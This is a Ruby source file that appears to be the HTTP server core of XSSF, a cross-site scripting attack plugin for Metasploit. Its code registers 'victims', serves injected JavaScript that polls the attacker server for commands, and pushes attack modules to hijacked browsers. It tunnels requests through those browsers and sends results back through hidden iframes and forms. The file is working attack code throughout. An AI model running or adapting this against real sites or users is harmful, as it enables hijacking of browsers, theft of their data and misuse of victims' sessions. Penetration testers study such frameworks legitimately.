require 'cgi'
require 'rex/ui'
require 'base64'
require 'uri'

#
# This class implements a HTTP Server used for the new XSSF plugin.
#
module Msf
	module Xssf
		module XssfMaster
			include Msf::Xssf::XssfDatabase
			include Msf::Xssf::XssfProxy
			
			#
			# Starts the server
			#
			def start(host, port, uri)	
				self.serverURI  = uri
				self.serverPort = port
				self.serverHost = real_address(host)
				self.xssfServer = "#{self.serverHost}:#{self.serverPort}#{self.serverURI}"
				return false if not register_server(self.serverHost, self.serverPort, self.serverURI)
				
				self.server = Rex::Proto::Http::Server.new(port, host)
				self.server.start

				self.server.add_resource(self.serverURI,'Proc' => Proc.new { |cli, request| xssf_server_request(cli, request) }) 	# Listening connections to URI
				self.server.add_resource("[a-zA-Z]"	   ,'Proc' => Proc.new { |cli, request| xssf_proxy_request(cli, request)  })	# Listening others connections (PROXY mode)

				# Check in background for active victims !
				Thread.new do; while (self.server) do;	update_active_victims;	Rex::ThreadSafe.sleep(5);	end; end
				
				return true
			end

			#
			# Stops the server
			#
			def stop
				self.server.remove_resource(".")
				self.server.stop if self.server
				self.server = nil
			end

			#
			# This method is triggered each time a request is done on the URI.
			#
			def xssf_server_request(cli, request)
				begin
					case request.method.upcase
						when 'GET';		process_get(cli, request)	# Case of a GET request
						when 'POST';	process_post(cli, request)	# Case of a POST request
						else;			self.server.send_e404(cli, request)	
					end
				rescue
					self.server.send_e404(cli, request)	
				end
			end

			#
			# Manages GET requests
			#
			def process_get(cli, request)
				interval = VICTIM_INTERVAL;		location = "Unknown";	id = nil
				
				(request.param_string.split('&')).each do |p|
					interval= Integer($1) 	if (p =~ /^#{PARAM_INTERVAL}=(\d+)$/)
					location= $1 			if (p =~ /^#{PARAM_LOCATION}=(.+)$/)
					id		= Integer($1) 	if (p =~ /^#{PARAM_ID}=(.+)$/)
				end
				
				((request['Cookie'] =~ /#{PARAM_ID}=(\d+)/) ? id = Integer($1) : id = nil) if not (id)

				case request.uri_parts['Resource']
					# Page asked is the victim loop page : Send loop page to the victim if correctly saved in the database
					when /^\/#{VICTIM_LOOP}$/, /#{self.xssfServer + VICTIM_LOOP}$/
						if (id)
							get_victim(id) ? update_victim(id, "Unknown", interval) : (id = add_victim(cli.peerhost, interval, request['User-Agent'].downcase))
						else
							id = add_victim(cli.peerhost, interval, request['User-Agent'].downcase)
						end
						
						if (id)
							# If auto attacks are running for this new victim, then we add first one to the victim
							add_auto_attacks(id)

							# Don't know how P3P works (Compact Cookies Policy for IE), but it works !
							send_response(cli, loop_page(id) + xssf_post(id), 200, "OK", {'Content-Type' => 'application/javascript', 'P3P' => 'CP="CAO PSA OUR"', 'Set-Cookie' => "id=#{id}"})
						else
							self.server.send_e404(cli, request)
						end

					# Page asked is the victim ask page (victim is asking for new commands)
					when /^\/#{VICTIM_ASK}$/, /#{self.xssfServer + VICTIM_ASK}$/
						if (id)	# If an id is given, check if victim is in an attack process or not
							update_victim(id, location)

							victim_cookie(id) if (request['Cookie'])
								
							if (res = get_first_attack(id))								# If an attack is waiting for current victim
								if (http_request_module(cli, res[0], request, id))
									puts ""
									print_good("Code '#{res[1]}' sent to victim '#{id}'")
									attacked_victims
									create_log(id, "Attack '#{res[1]}' launched at url '#{res[0]}'", nil) 
								end
							else
								if (victim = victim_tunneled)
									if ((victim.id == id) and (TUNNEL[1] == "TO_SEND"))
										TUNNEL[1] = "SENT"
										send_response(cli, TUNNEL[0], 200, "OK", {'Content-Type' => 'application/javascript'})
									else
										self.server.send_e404(cli, request)
									end
								else
									self.server.send_e404(cli, request)
								end
							end
						else
							self.server.send_e404(cli, request)
						end

					# Page asked is the XSSF test page (for test or ghost)
					when /^\/#{VICTIM_TEST}$/, /#{self.xssfServer + VICTIM_TEST}$/
						send_response(cli, test_page)
						
					# Victim log page is asked
					when /^\/#{VICTIM_LOG}$/, /#{self.xssfServer + VICTIM_LOG}$/
						(cli.peerhost == self.serverHost) ? send_response(cli, export_attacks(id)) : self.server.send_e404(cli, request)

					# Other page is asked by a victim : redirect to known file or active module (This part needs cookie to be activated)
					else 
						if (id)
							# If file is known, server sends it directly to the victim, if not, asking to the module !
							if (request.param_string.empty? and File.exist?(INCLUDED_FILES + request.uri_parts['Resource']) and (request.uri_parts['Resource'] != '/'))
								send_response(cli, add_xssf_post(read_file(INCLUDED_FILES + request.uri_parts['Resource']), id))
							else
								if (url = current_attack(id)) 
									uri = URI.parse(url)
									(url = url.gsub(/#{uri.path}/, "") + uri.path + request.raw_uri) if (uri.path != '/')
									(data = run_http_client(url)) ? send_response(cli, add_xssf_post(data.body, id), data.code, data.message, data.headers) : self.server.send_e404(cli, request)
								else
									self.server.send_e404(cli, request)
								end
							end
						else
							self.server.send_e404(cli, request)
						end
				end
			end

			#
			# Manage POST requests
			# Called when the victims responds to an attack (if attack send a response)
			#
			def process_post(cli, request)
				case request.uri_parts['Resource']
					when /^\/#{VICTIM_ANSWER}$/, /#{self.xssfServer + VICTIM_ANSWER}$/
						response = nil; tunnel_ctype = nil; resp_type = nil; mod_name = nil; id = nil;

						(request.body.split('&')).each do |p|
							response 	= $1 			if (p =~ /^#{PARAM_RESPONSE}=(.*)$/)
							tunnel_ctype= $1 			if (p =~ /^#{PARAM_CTYPE}=(.+)$/)
							resp_type	= Integer($1) 	if (p =~ /^#{PARAM_TYPE}=(.+)$/)
							mod_name	= $1 			if (p =~ /^#{PARAM_NAME}=(.+)$/)
							id			= Integer($1) 	if (p =~ /^#{PARAM_ID}=(.+)$/)
						end
						
						((request['Cookie'] =~ /#{PARAM_ID}=(\d+)/) ? id = Integer($1) : id = nil) if not (id)

						if (id && resp_type)
							case resp_type
								when 0				# POST FROM A MODULE
									create_log(id, CGI::unescape(response).strip, CGI::unescape(mod_name).strip)
									send_response(cli, "OK")
								when 1				# POST IN PROXY MODE
									if(TUNNEL[1] == "SENT")
										TUNNEL[2] = (CGI::unescape(tunnel_ctype)).strip if tunnel_ctype
										response ? TUNNEL[1] = CGI::unescape(response).strip : TUNNEL[1] = ""

										print_good("ADDING RESPONSE IN TUNNEL FOR '#{TUNNEL[3]}'")
										send_response(cli, "OK")
									else
										self.server.send_e404(cli, request)
									end
								else
									self.server.send_e404(cli, request)
							end
						else
							self.server.send_e404(cli, request)
						end
					else
						self.server.send_e404(cli, request)
				end
			end
			
			#
			# Returns real network address
			#
			def real_address(ip)
				return Rex::Socket.source_address('1.2.3.4') if (ip == '0.0.0.0') 
				return ip
			end

		protected
			attr_accessor :server, :serverURI, :serverPort, :serverHost, :xssfServer
			
			#
			# Transmits a response to the supplied client
			#
			def send_response(cli, body, code = 200, message = "OK", headers = {})
				response = Rex::Proto::Http::Response.new(code, message, Rex::Proto::Http::DefaultProtocol);
				response['Content-Type'] = 'text/html'
				response.body = body
				headers.each_pair { |k,v| response[k] = v }
				cli.send_response(response)
			end
			
			#
			# Acts like a client and server. 
			# Ask for a page to a module and forward the result to the client.
			# If module sends complete html page, creates an iframe on client side
			#
			def http_request_module(cli, url, request, id)
				data = run_http_client(url)
				if (data != nil)
					if ((data.code == 302) && data['Location'])
						code = %Q{
							iframe = createCrossIframe("REDIRECT_IFRAME", 150, 150);
							iframe.src = "http://#{self.xssfServer}#{data['Location']}";
							document.body.appendChild(iframe);
						}
						
						data['Content-Type'] = "text/javascript"
						send_response(cli, code, "200", "OK", data.headers)
					elsif (data.body =~ /^(.*<html[^>]*>)(.*)(<\/html>.*)$/im)
						# Can't create IFRAME dynamically because we need the src to be the attack server ! Victim need to ask again
						code = %Q{
							iframe = createCrossIframe("REDIRECT_IFRAME", 150, 150);
							iframe.src = "http://#{self.xssfServer}#{((URI.parse(url)).path == '/') ? "" : (URI.parse(url)).path}";
							document.body.appendChild(iframe);
						}

						data['Content-Type'] = "text/javascript"
						send_response(cli, code, data.code, data.message, data.headers)
					else
						send_response(cli, add_xssf_post(data.body, id), data.code, data.message, data.headers)
					end
					
					return true
				else
					self.server.send_e404(cli, request)
					return false
				end
			end

			#
			# Adds XSSF_POST function to html pages in iframes
			#
			def add_xssf_post(data, id)
				if (data =~ /^(.*<head[^>]*>.*)(<\/head>.*)$/im)
					data = $1 + %Q{ <script type='text/javascript'>  		} + xssf_post(id) + %Q{ </script> } + $2
				elsif (data =~ /^(.*<html[^>]*>)(.*<\/html>.*)$/im)
					data = $1 + %Q{ <head> <script type='text/javascript'>  } + xssf_post(id) + %Q{ </script> </head>} + $2
				end
				
				return data
			end
			
			#
			# Runs an HTTP client on a given url
			#
			def run_http_client(url)
				begin
					if (url =~ /^http:\/{1,2}([a-z0-9\-\.]+)(:([0-9]{1,5}))?(\/.*)?$/)
						client = Rex::Proto::Http::Client.new($1, $3 ? $3 : 80, {}, false)
						resp = client.send_recv(client.request_raw('method' => 'GET', 'uri'    => $4), -1)
						client.close
						return resp
					end
				rescue	# Nothing
				end
				return nil
			end
			
			#
			# Returns test page
			#
			def test_page
				return %Q{ 	<html><body>
								<h2> TEST PAGE WITH XSS </h2><br/>
								<pre> INJECTED : &lt;script type=&quot;text/javascript&quot; src=&quot;http://#{self.xssfServer}#{VICTIM_LOOP}?#{PARAM_INTERVAL}=5&quot;&gt;&lt;/script&gt;</pre>
								<script type="text/javascript" src= "http://#{self.xssfServer}#{VICTIM_LOOP}?#{PARAM_INTERVAL}=5" ></script>
								<a href="http://www.google.fr">Go GoOgLe</a>
							</body></html>
				}
			end

			#
			# Returns loop page
			#
			def loop_page(id)
				loop = %Q{
					function executeCode() {
						if (document.getElementById('XSSF_CODE') != null) document.body.removeChild(document.getElementById('XSSF_CODE'));
						script = document.createElement('script');	script.id = "XSSF_CODE";
						script.src = "http://#{self.xssfServer}#{VICTIM_ASK}?#{PARAM_LOCATION}=" + window.location + "&#{PARAM_ID}=#{id}&time=" + escape(new Date().getTime());
						document.body.appendChild(script);
					}
	
					if (typeof(victim_loop) != "undefined")	clearTimeout(victim_loop);
					victim_loop = setInterval(executeCode, #{(victim = get_victim(id)) ? victim.interval : VICTIM_INTERVAL} * 1000);	// Interrompt with clearTimeout(victim_loop);
				}

				return loop
			end
			
			#
			# Returns XSSF_POST function to code
			#
			def xssf_post(id)
				return %Q{
					SERVER = "http://#{self.xssfServer}";
					
					function createXHR() {
						if (window.XMLHttpRequest) return new XMLHttpRequest();
	 
						if (window.ActiveXObject) {
							var names = ["Msxml2.XMLHTTP.6.0", "Msxml2.XMLHTTP.3.0", "Msxml2.XMLHTTP", "Microsoft.XMLHTTP"];
							for(var i in names) {
								try{ return new ActiveXObject(names[i]); }
								catch(e){}
							}
						}
					}
					xhr = createXHR();
					
					function createCrossIframe(id, width, height) {	// Creates an Iframe that enables POST to XSSF Server
						if (document.getElementById(id) != null) document.body.removeChild(document.getElementById(id));
						
						iframe = document.createElement('iframe');
						iframe.id = id;
						iframe.width = "0" + width + "%";
						iframe.height = "0" + height + "%";
						iframe.style.border = "0px";
						iframe.frameborder = "0";
						iframe.scrolling = "auto";
						iframe.style.backgroundColor = "transparent";
						
						return iframe;
					}

					function XSSF_POST(response, mod_name, tunnel_ctype, response_type) {
						if (typeof(tunnel_ctype) == "undefined") 					tunnel_ctype = "text/html";
						else if ((tunnel_ctype == "") || (tunnel_ctype == null))	tunnel_ctype = "text/html";
						
						if (typeof(mod_name) == "undefined") 						mod_name = "Unknown";
						else if ((mod_name == "") || (mod_name == null))			mod_name = "Unknown";
							
						if (typeof(response_type) == "undefined") 					response_type = 0;
						else if ((response_type == "") || (response_type == null))	response_type = 0;

						iframe = createCrossIframe("XSSF_POST_IFRAME", 0, 0);
						document.body.appendChild(iframe);

						var doc = null;
	   					if(iframe.contentDocument)		doc = iframe.contentDocument;
	   					else if(iframe.contentWindow)   doc = iframe.contentWindow.document;
						else if(iframe.document)		doc = iframe.document;
						else							return;
						
						string  = "<form name='XSSF_FORM' id='XSSF_FORM' enctype='text/plain' method='POST' action='http://#{self.xssfServer}#{VICTIM_ANSWER}' >";
						string += "<input name='#{PARAM_NAME}' 		value='"+escape(mod_name)+"'	type='hidden'>"; 
						string += "<input name='#{PARAM_RESPONSE}' 	value='"+escape(response)+"'	type='hidden'>"; 
						string += "<input name='#{PARAM_CTYPE}' 	value='"+tunnel_ctype+"' 		type='hidden'>"; 
						string += "<input name='#{PARAM_TYPE}' 		value='"+response_type+"' 		type='hidden'>"; 
						string += "<input name='#{PARAM_ID}' 		value='#{id}' 					type='hidden'>";
						string += "</form>";
						
						doc.open(); doc.write(string); doc.close(); doc.forms[0].submit();
					}
				}
			end
			
			#
			# Reads a file and return data
			#
			def read_file(name)
				data = ""
				file = File.open(name, "r")
				file.each_line do |l|;	data << l;	end
				file.close;
				
				return data
			end
		end
	end
end